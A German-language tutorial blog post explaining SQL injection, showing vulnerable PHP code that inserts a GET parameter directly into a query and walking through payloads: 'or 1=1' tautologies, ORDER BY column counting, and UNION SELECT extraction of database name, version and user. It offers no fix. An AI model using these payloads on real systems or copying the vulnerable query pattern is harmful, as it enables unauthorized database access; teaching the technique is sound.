---
layout: post
title: SQL Injections und wie sie entstehen
author: Manuel Zarat
category: tutorials
tags: protokoll
permalink: /post/sqlinjections
---

<p>Ich habe ein Beispiel auf <a href="http://www.sqlfiddle.com/#!9/70f022" target="_blank" rel="noopener">SQL Fiddle</a> erstellt.</p>
<!--excerpt_separator-->
<pre>CREATE TABLE `user` (<br />  `id` INT NOT NULL AUTO_INCREMENT,<br />  `mail` VARCHAR(50) NULL,<br />  `pass` VARCHAR(50) NULL,<br />  PRIMARY KEY (`id`));<br />insert into user (mail,pass) values ( 'user1@zarat.ml', md5('user1') );<br />insert into user (mail,pass) values ( 'user2@zarat.ml', md5('user2') );<br />insert into user (mail,pass) values ( 'user3@zarat.ml', md5('user3') );</pre>
<p>Nehmen wir an, wir nutzen aus Unwissenheit folgenden SQL Query:</p>
<pre>$id = $_GET['id'];
mysql_Query("SELECT * FROM user WHERE id= $id"); //oder
mysql_Query("SELECT * FROM user WHERE id= '$id'");
</pre>
<p>Anhand des Ergebnisses dieser Abfrage entscheiden wir, ob der User eingelogt ist oder nicht. Ein Hacker würde versuchen, den Query zu verändern indem er die als GET Parameter übergebene id manipuliert.</p>
<pre>SELECT * FROM user WHERE id=1 or 1=1; //oder
SELECT * FROM user WHERE id='1' or '1'='1';</pre>
<p>Es ist egal, welche id übergeben wird, der Query wird so abgeändert, das das nachfolgende or 1=1 alle vorangehenden Statements überschreibt. Wenn diese Abfrage an den SQL Interpreter weitergeleitet wird, bedeutet das, man kann sogut wie alles in den Query interpretieren. Ich möchte jetzt den Namen der Datenbank wissen. Dazu muss ich zuerst herausfinden, wieviele Spalten der Datensatz hat.</p>
<pre>SELECT * FROM user WHERE id=1 or 1=1 order by 1; //oder
SELECT * FROM user WHERE id='1' or '1'='1' order by 1;</pre>
<p>Diese ORDER BY Klausel erhöhe ich dabei jedes mal um 1, bis ein Fehler kommt. Ich weiß jetzt die letzte Zahl ist die Anzahl an Spalten! Somit kann ich den Query abändern und mit einem UNION SELECT das Ergebnis "überschreiben".</p>
<pre>SELECT * FROM user WHERE id=1 or 1=1 union select 1,2,3; //oder
SELECT * FROM user WHERE id='1' or '1'='1' union select 1,2,3;</pre>
<p>Dieser Query wäre zwar aufwendig und unnötig aber noch kein "Fehler" in dem Sinn. Statt die gefundenen Variablen anhand der Nummerierung ins Ergebnis zu schreiben nutze ich interne Funktionen um meine Informationen zui erhalten. Erstmal sind folgende Funktionen von Bedeutung</p>
<ul>
<li>database()</li>
<li>user()</li>
<li>version()</li>
</ul>
<pre>SELECT * FROM user WHERE id=1 or 1=1 union select database(),version(),user(); //oder
SELECT * FROM user WHERE id='1' or '1'='1' union select database(),version(),user();</pre>
<p>Damit haben wir vollen Zugriff auf die Datenbank.</p>
